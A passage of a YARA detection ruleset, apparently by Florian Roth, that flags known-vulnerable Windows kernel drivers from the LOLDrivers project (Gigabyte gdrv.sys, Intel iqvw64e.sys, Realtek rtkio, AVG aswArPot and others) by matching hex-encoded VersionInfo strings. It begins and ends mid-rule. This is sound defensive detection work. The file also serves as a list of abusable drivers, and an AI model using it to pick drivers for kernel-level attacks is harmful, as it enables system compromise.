004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004c007600350036003100610076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280063002900200031003900390036002d00320030003000390020004c006f006700690074006500630068002e002000200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule PUA_VULN_Driver_Getactechnologycorporation_Mtcbsvsys_Getacsystemserviceprovider_E6D1_RID4855 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - GtcKmdfBs.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:39:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002c00200032002c00200030002c00200033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002c00200032002c00200030002c00200033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0074006300420053007600330032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004700740063004b006d0064006600420073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300031003900200047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Hpinc_Hpportioxsys_Hpportio_C505_RID3932 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HpPortIox64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:53:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800700050006f007200740049006f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0048005000200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0039 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800700050006f007200740049006f007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800700050006f007200740049006f } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800700050006f007200740049006f007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002d003200300032003100200048005000200049006e0063002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiowxsys_Realtekiodriver_AB8F_RID3C2E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:00:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300039002e0030003700300039002e0032003000320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300039002e0030003700300039002e0032003000320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f007700310030007800360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f007700310030007800360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003200300020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpot_Avginternetsecuritysystem_2CE8_RID451C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:21:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e00310030002e003100370031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e00310030002e003100370031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Innotekgmbh_Vboxtapsys_Virtualboxhostinterfacenetworkingdriver_994F_RID47FA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxTAP.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:24:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200048006f0073007400200049006e00740065007200660061006300650020004e006500740077006f0072006b0069006e00670020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002f0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002f0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078005400410050002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f007800200048006f0073007400200049006e00740065007200660061006300650020004e006500740077006f0072006b0069006e00670020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078005400410050002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0069006e006e006f00740065006b00200047006d00620048002000260020004f00740068006500720073 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_9254_RID36E0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:14:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200066006f00720020004d00530049004400440052005f00430043 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_3AF9_RID4591 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:41:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e0031003000780038003600200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_4429_RID3DFB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iqvw64e.sys, iQVW64.SYS, NalDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:17:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300033002e0030002e00370020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300033002e0030002e0037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003300200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiowxsys_Realtekiodriver_32E1_RID3C08 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:54:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300038002e0030003800320033002e0032003000310037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300038002e0030003800320033002e0032003000310037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f007700310030007800360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f007700310030007800360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100370020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Micsystechnologycoltd_Msiosys_Msiodriverversion_X_43BA_RID426E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - MsIo64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:27:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d004900430053005900530020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d0049004300530059005300200054006500630068006e006f006c006f0067007900200043006f002e002c0020004c00540064 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003100200078003600340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00310020007800360034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004d00730049006f00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d00730049006f003600340020004400720069007600650072002000560065007200730069006f006e00200031002e0031 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004d00730049006f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003100390020004d00490043005300590053 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_1078_RID4659 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:14:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0033002e0034003200330039002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0033002e0034003200330039002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310039002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Gigabytetechnologycoltd_Gdrvsys_Gigabytesoftwaredriver_26C2_RID4452 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:48:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041002d00420059005400450020004e006f006e0050006e00500020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004900470041002d004200590054004500200054004500430048004e004f004c004f0047005900200043004f002e002c0020004c00540044002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0047004900470041002d004200590054004500200053006f0066007400770061007200650020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310037 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Interfacecorporation_Cpxcsys_Gpcxcdiobmpcicpci_05C1_RID40C4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CP2X72C.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:16:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004700500043002d0032005800370032004300200049002f004f0020004d006f00640075006c006500200044006500760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007400650072006600610063006500200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e00330030002e00330033002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e00330030002e00330033002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043005000320058003700320043002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004700500043002d00320058003700320043002000440049004f002d0042004d0028005000430049002f0043002d0050004300490029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043005000320058003700320043002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200032003000300031002c0020003200300032003000200049006e007400650072006600610063006500200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_CC68_RID3DC0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:07:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e00330030002e0030002e0031003000390039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100380020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_A209_RID3D0A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:37:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00760069007200610067007400360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000310031002c002000320030003100330020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrcodenamelonghornddkprovider_Cpudriver_Windowsrcodenamelonghornddkdriver_159E_RID4ED7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WCPU.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:49:43\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041005300550053002000540044004500200043005000550020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e003100360033003800360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e00310036003300380036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043005000550020004400720069007600650072 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043005000550020004400720069007600650072 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020006200790020004100530055005300540065006b00200043004f004d0050005500540045005200200049004e0043002e00200032003000300036 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Proxydrvsys_Nn_0B20_RID33E0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ProxyDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:06:31\"\n      score = 40\n      customer = \"demo\"\n      license 